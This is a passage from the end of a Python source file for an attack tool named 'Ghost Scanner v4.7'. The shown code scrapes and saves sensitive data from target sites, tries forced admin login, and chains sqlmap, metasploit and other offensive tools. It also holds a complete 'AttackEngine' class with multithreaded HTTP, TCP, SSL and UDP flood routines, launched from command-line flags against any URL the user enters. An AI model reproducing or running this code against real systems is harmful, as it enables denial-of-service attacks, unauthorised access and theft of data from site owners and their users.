                    pdf.multi_cell(0,5,f"  Param: {v.get('param','N/A')} | Payload: {str(v.get('payload','N/A'))[:50]} | Risk: {v.get('risk')}")
                pdf.ln(1)
        pdf.add_page();pdf.set_font('Arial','B',13);pdf.cell(0,8,'Sensitive Data',ln=True)
        pdf.set_font('Arial','',9)
        for k,v in results["sensitive_data"].items():
            if v:pdf.multi_cell(0,5,f'{k.upper()}: {", ".join(str(x) for x in v[:10])}')
        if results.get("ai_analysis"):
            pdf.add_page();pdf.set_font('Arial','B',13);pdf.cell(0,8,'AI Analysis',ln=True)
            pdf.set_font('Arial','',9)
            pdf.multi_cell(0,6,results["ai_analysis"].replace('**','').replace('###','>>>')[:8000])
        pdf.output(output_path)
        Console().print(f"[green]PDF: {os.path.abspath(output_path)}[/green]")

    def _save_sensitive_data(self,all_s):
        combined={}
        for s in all_s:
            for k,v in s.items():combined.setdefault(k,[]).extend(v)
        ts=int(time.time())
        for k,v in combined.items():
            if v:
                uniq=list(set(str(x) for x in v if x))
                if uniq:
                    fn=f"{self.sensitive_folder}/{k}_{ts}.txt"
                    with open(fn,'w',encoding='utf-8') as f:f.write('\n'.join(uniq))
                    self.results_scan["sensitive_data"][k]=uniq[:20]

    def _generate_sensitive_pdf(self,data_type,data_list,target,output_dir):
        if not data_list:return None
        class PDF(FPDF):
            def header(self):
                self.set_font('Arial','B',14)
                self.cell(0,10,f'{data_type.upper()} - Ghost Scanner v4.7',ln=True,align='C');self.ln(3)
            def footer(self):
                self.set_y(-15);self.set_font('Arial','I',8)
                self.cell(0,10,f'Target: {target} | Page {self.page_no()}',align='C')
        pdf=PDF();pdf.add_page();pdf.set_font('Arial','',11)
        pdf.cell(0,8,f'Target: {target}',ln=True)
        pdf.cell(0,8,f'Data Type: {data_type.upper()}',ln=True)
        pdf.cell(0,8,f'Total: {len(data_list)}',ln=True)
        pdf.ln(5);pdf.set_font('Arial','B',12);pdf.cell(0,8,'DATA:',ln=True)
        pdf.set_font('Arial','',9)
        for i,item in enumerate(data_list[:500],1):
            text=json.dumps(item,ensure_ascii=False) if isinstance(item,dict) else str(item)
            pdf.multi_cell(0,5,f'{i}. {text[:300]}')
        os.makedirs(output_dir,exist_ok=True)
        filename=os.path.join(output_dir,f'{data_type}_{int(time.time())}.pdf')
        pdf.output(filename)
        Console().print(f"[green]✓ PDF {data_type}: {os.path.abspath(filename)}[/green]")
        return filename

    def _generate_all_sensitive_pdfs(self,sensitive_data,admin_data,target):
        pdf_dir=os.path.join(self.sensitive_folder,'pdfs')
        os.makedirs(pdf_dir,exist_ok=True)
        pdfs=[]
        for key,values in sensitive_data.items():
            if values and isinstance(values,list) and len(values)>0:
                fp=self._generate_sensitive_pdf(key,values,target,pdf_dir)
                if fp:pdfs.append(fp)
        self.results_scan["sensitive_pdfs"]=pdfs

    # ---------- MAIN SCAN ----------
    def run_scan(self,target):
        self.results_scan["target"]=target
        self.results_scan["domain"]=urlparse(target).netloc
        self.results_scan["domain_category"]=self._classify_domain(self.results_scan["domain"])
        self.results_scan["timestamp"]=datetime.now().isoformat()
        start=time.time()
        console=Console()
        console.print(f"[bold red]🚀 Ghost Scan v4.7 on {target}[/bold red]")
        console.print(f"[bold cyan]Category: {self.results_scan['domain_category']}[/bold cyan]")

        resp=self._smart_request(target,timeout=15)
        if not resp:
            console.print("[red]Failed to access target![/red]");return
        html=resp.text

        # Internal scans
        console.print("[yellow]Internal scans...[/yellow]")
        self.results_scan["vulnerabilities"]["robots"]=self._check_robots(target)
        self.results_scan["vulnerabilities"]["sitemap"]=self._check_sitemap(target)
        self.results_scan["vulnerabilities"]["dir_enum"]=self._check_dir_enum(target)
        self.results_scan["vulnerabilities"]["sensitive_files"]=self._check_sensitive_files(target)
        self.results_scan["vulnerabilities"]["security_headers"]=self._check_security_headers(target)
        self.results_scan["vulnerabilities"]["waf_detection"]=self._check_waf(target)
        self.results_scan["vulnerabilities"]["cors"]=self._check_cors(target)
        self.results_scan["vulnerabilities"]["open_redirect_sneijder"]=self._check_open_redirect(target)
        self.results_scan["vulnerabilities"]["ssl_info"]=self._check_ssl_info(target)
        self.results_scan["vulnerabilities"]["cookie_flags"]=self._check_cookie_flags(target)
        self.results_scan["vulnerabilities"]["rate_limit_sneijder"]=self._check_rate_limit(target)
        self.results_scan["vulnerabilities"]["wp_activity_log_rce"]=self._check_wp_activity_log(target)

        forms=self._extract_forms(html,target)
        self.results_scan["vulnerabilities"]["csrf_sneijder"]=self._check_csrf(target,forms)

        admin_res=self._force_admin_login(forms,target,target)
        self.results_scan["vulnerabilities"]["admin_access"]=admin_res
        self.results_scan["vulnerabilities"]["login_bypass"]=admin_res

        all_p={}
        all_p.update(self._extract_params_from_url(target))
        for form in forms:
            if form['method']=='GET':
                for i in form['inputs']:all_p[i['name']]='1'
        api_urls=self._extract_api_endpoints(html,target)
        for u in api_urls:
            for c in self.common_params:all_p[c]='1'
        if not all_p:
            for c in self.common_params[:30]:all_p[c]='1'
        params=dict(list(all_p.items())[:100])

        self.results_scan["ports"]=self._scan_ports(self.results_scan["domain"])

        all_s=[self._extract_sensitive_data(html)]
        for u in api_urls[:5]:
            r=self._smart_request(u,timeout=6)
            if r:all_s.append(self._extract_sensitive_data(r.text))
        self._save_sensitive_data(all_s)

        self.results_scan["vulnerabilities"]["xss_dom"]=self._check_dom_xss(html,target)
        self.results_scan["vulnerabilities"]["xss_context_aware"]=self._scan_xss_dalfox(target,params)
        self.results_scan["vulnerabilities"]["sql_injection"]=self._scan_sql(target,params)

        # v4.7 NEW checks
        if self.all_checks or self.ddos_check:
            console.print("[bold yellow]🔥 v4.7: DDoS Vulnerability Check...[/bold yellow]")
            self.results_scan["vulnerabilities"]["ddos_vulnerability"]=self._check_ddos_vulnerability(target)
        if self.all_checks or self.deface:
            console.print("[bold yellow]🔥 v4.7: Advanced Deface Detection...[/bold yellow]")
            self.results_scan["vulnerabilities"]["deface"]=self._check_deface_advanced(target)
        if self.all_checks:
            console.print("[bold yellow]🔥 v4.7: JWT Attack...[/bold yellow]")
            self.results_scan["vulnerabilities"]["jwt_attack"]=self._check_jwt_attack(target)
            console.print("[bold yellow]🔥 v4.7: HTTP Smuggling...[/bold yellow]")
            self.results_scan["vulnerabilities"]["http_smuggling"]=self._check_http_smuggling(target)
            console.print("[bold yellow]🔥 v4.7: GraphQL Introspection...[/bold yellow]")
            self.results_scan["vulnerabilities"]["graphql_introspection"]=self._check_graphql(target)
            console.print("[bold yellow]🔥 v4.7: OAuth Bypass...[/bold yellow]")
            self.results_scan["vulnerabilities"]["oauth_bypass"]=self._check_oauth_bypass(target)

        # External tools
        if self.use_tools:
            console.print("[bold magenta]🔥 v4.7: External tools (19)...[/bold magenta]")
            subs=self._run_subfinder(self.results_scan["domain"])+self._run_amass(self.results_scan["domain"])
            self.results_scan["external"]["subdomains"]=subs
            self.results_scan["external"]["dns_records"]=self._run_dnsx(self.results_scan["domain"])
            live_targets=subs[:20] if subs else [target]
            self.results_scan["external"]["live_hosts"]=self._run_httpx(live_targets)
            self.results_scan["external"]["naabu_ports"]=self._run_naabu(self.results_scan["domain"])
            katana_urls=self._run_katana(target)
            self.results_scan["external"]["katana_urls"]=katana_urls[:200]
            self.results_scan["external"]["historical_urls"]=self._run_gau(self.results_scan["domain"])+self._run_waybackurls(self.results_scan["domain"])
            self.results_scan["vulnerabilities"]["nuclei"]=self._run_nuclei(target)
            self.results_scan["vulnerabilities"]["ffuf"]=self._run_ffuf(target)
            self.results_scan["vulnerabilities"]["sqlmap"]=self._run_sqlmap(target)
            self.results_scan["vulnerabilities"]["dalfox_external"]=self._run_dalfox(target)
            self.results_scan["external"]["arjun_params"]=self._run_arjun(target)
            js_urls=[u for u in katana_urls if '.js' in u.lower()][:20]
            self.results_scan["vulnerabilities"]["secretfinder"]=self._run_secretfinder(js_urls)
            self.results_scan["vulnerabilities"]["interactsh"]=self._run_interactsh(target)
            self.results_scan["vulnerabilities"]["nmap"]=self._run_nmap(target)
            self.results_scan["vulnerabilities"]["metasploit"]=self._run_metasploit(target)
            self.results_scan["vulnerabilities"]["wireshark"]=self._run_wireshark(target,duration=10)
            self.results_scan["vulnerabilities"]["burpsuite"]=self._run_burpsuite(target)
            # v4.7 subdomain takeover (pake subdomains yg udah didapat)
            self.results_scan["vulnerabilities"]["subdomain_takeover"]=self._check_subdomain_takeover(subs)

        # Summary
        all_f=[]
        for cat,items in self.results_scan["vulnerabilities"].items():
            if isinstance(items,list):all_f.extend(items)
        self.results_scan["summary"]={
            "total":len(all_f),
            "critical":len([f for f in all_f if f.get('risk')=='CRITICAL']),
            "high":len([f for f in all_f if f.get('risk')=='HIGH']),
            "medium":len([f for f in all_f if f.get('risk')=='MEDIUM']),
            "low":len([f for f in all_f if f.get('risk')=='LOW'])
        }
        self.results_scan["scan_duration"]=time.time()-start
        self.results_scan["validated"]=True

        if self.ai:
            self.results_scan["ai_analysis"]=self._ai_analysis(all_f,target,self.results_scan.get("admin_data"))

        self._generate_all_sensitive_pdfs(self.results_scan["sensitive_data"],self.results_scan.get("admin_data",{}),target)

        self._display(all_f)

        jf=f"{self.result_folder}/scan_{int(time.time())}.json"
        with open(jf,'w',encoding='utf-8') as f:json.dump(self.results_scan,f,indent=2,ensure_ascii=False)
        console.print(f"[green]JSON: {os.path.abspath(jf)}[/green]")
        if self.pdf:
            self._generate_pdf(self.results_scan,f"{self.result_folder}/report_{int(time.time())}.pdf")

    def _display(self,findings):
        c=Console()
        if not findings:c.print("[green]No vulnerabilities found.[/green]");return
        t=Table(title="Findings",box=box.ROUNDED)
        for col in ["Type","Param","Risk","Verified"]:t.add_column(col)
        for f in findings[:30]:
            v="OK" if f.get('poc',{}).get('verified') else "?"
            t.add_row(f.get('type','Unknown')[:40],str(f.get('param','N/A'))[:20],f.get('risk','INFO'),v)
        c.print(t)

# ========== ATTACK ENGINE ==========
class AttackEngine:
    def __init__(self,target,threads=200,duration=30,method='http'):
        self.target=target;self.threads=threads;self.duration=duration
        self.method=method;self.running=False
        self.scraper=cloudscraper.create_scraper(browser={'browser':'chrome','platform':'windows','desktop':True})
        self.ua=UserAgent()
    def start(self):
        c=Console();c.print(f"[red]Starting {self.method.upper()} on {self.target}[/red]")
        self.running=True
        if self.method in ['http','all']:self._http_flood()
        if self.method in ['syn','all']:self._syn_flood()
        if self.method in ['ssl','all']:self._ssl_reneg()
        if self.method in ['udp','all']:self._udp_flood()
        time.sleep(self.duration);self.running=False
        c.print("[green]Attack stopped.[/green]")
    def _http_flood(self):
        def w():
            while self.running:
                try:
                    h={'User-Agent':self.ua.random,'Accept':'*/*','Connection':'keep-alive'}
                    self.scraper.get(self.target,headers=h,timeout=3)
                except:pass
                time.sleep(random.uniform(0.01,0.05))
        for _ in range(self.threads):threading.Thread(target=w,daemon=True).start()
    def _syn_flood(self):
        def w():
            while self.running:
                try:
                    d=self.target.replace('https://','').replace('http://','').split('/')[0]
                    ip=socket.gethostbyname(d);port=random.choice([80,443])
                    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.settimeout(1)
                    s.connect((ip,port));s.send(b"GET / HTTP/1.1\r\nHost: "+d.encode()+b"\r\n\r\n");s.close()
                except:pass
                time.sleep(random.uniform(0.01,0.03))
        for _ in range(self.threads):threading.Thread(target=w,daemon=True).start()
    def _ssl_reneg(self):
        def w():
            while self.running:
                try:
                    d=self.target.replace('https://','').replace('http://','').split('/')[0]
                    ctx=ssl.create_default_context();s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.settimeout(3)
                    s.connect((d,443));ss=ctx.wrap_socket(s,server_hostname=d);ss.send(b"R"*4096);ss.close()
                except:pass
                time.sleep(random.uniform(0.05,0.1))
        for _ in range(self.threads):threading.Thread(target=w,daemon=True).start()
    def _udp_flood(self):
        def w():
            while self.running:
                try:
                    d=self.target.replace('https://','').replace('http://','').split('/')[0]
                    s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);s.settimeout(1)
                    s.sendto(b"X"*1024,(d,random.choice([53,123,161])))
                except:pass
                time.sleep(0.001)
        for _ in range(self.threads):threading.Thread(target=w,daemon=True).start()

# ========== MAIN ==========
def main():
    if '-h' in sys.argv or '--help' in sys.argv:show_help()
    p=argparse.ArgumentParser(description="Ghost Scanner v4.7",add_help=False)
    p.add_argument('-u','--url');p.add_argument('-o','--output',default='results.json')
    p.add_argument('-v','--verbose',action='store_true')
    p.add_argument('--proxy-list');p.add_argument('--validate-proxy',action='store_true')
    p.add_argument('--no-proxy',action='store_true');p.add_argument('--quick',action='store_true')
    p.add_argument('--pdf',action='store_true');p.add_argument('--ai',action='store_true')
    p.add_argument('--delay',type=float,default=0.5)
    p.add_argument('--force-admin',action='store_true')
    p.add_argument('--tools',action='store_true',help='Run 19 external tools')
    p.add_argument('--ddos-check',action='store_true',help='Check DDoS vulnerability')
    p.add_argument('--deface',action='store_true',help='Advanced deface detection')
    p.add_argument('--all-checks',action='store_true',help='Enable all new v4.7 checks')
    p.add_argument('--dos',action='store_true');p.add_argument('--ddos',action='store_true')
    p.add_argument('--syn',action='store_true');p.add_argument('--ssl-reneg',action='store_true')
    p.add_argument('--udp',action='store_true')
    p.add_argument('--threads',type=int,default=200);p.add_argument('--duration',type=int,default=30)
    args=p.parse_args()

    clear_screen();show_banner()

    # v4.7 FIX: Loop prompt kalau gak ada target
    if not args.url:
        try:
            args.url=input("Enter target URL (https://): ").strip()
            if not args.url:
                Console().print("[red]No target provided. Exiting.[/red]")
                sys.exit(1)
        except (KeyboardInterrupt,EOFError):
            Console().print("\n[yellow]Cancelled.[/yellow]")
            sys.exit(0)

    attack=args.dos or args.ddos or args.syn or args.ssl_reneg or args.udp
    if attack:
        m='http'
        if args.ddos:m='all'
        elif args.syn:m='syn'
        elif args.ssl_reneg:m='ssl'
        elif args.udp:m='udp'
        AttackEngine(args.url,threads=args.threads,duration=args.duration,method=m).start()
    else:
        scanner=GhostScanner(
            target=args.url,use_proxy=not args.no_proxy,proxy_file=args.proxy_list,
            validate_proxy=args.validate_proxy,quick=args.quick,pdf=args.pdf,
            ai=args.ai,delay=args.delay,force_admin=args.force_admin,use_tools=args.tools,
            ddos_check=args.ddos_check,deface=args.deface,all_checks=args.all_checks
        )
        try:scanner.run_scan(args.url)
        except KeyboardInterrupt:Console().print("[red]Interrupted.[/red]")
        except Exception as e:
            Console().print(f"[red]Error: {e}[/red]")
            import traceback;traceback.print_exc()

if __name__=="__main__":
    main()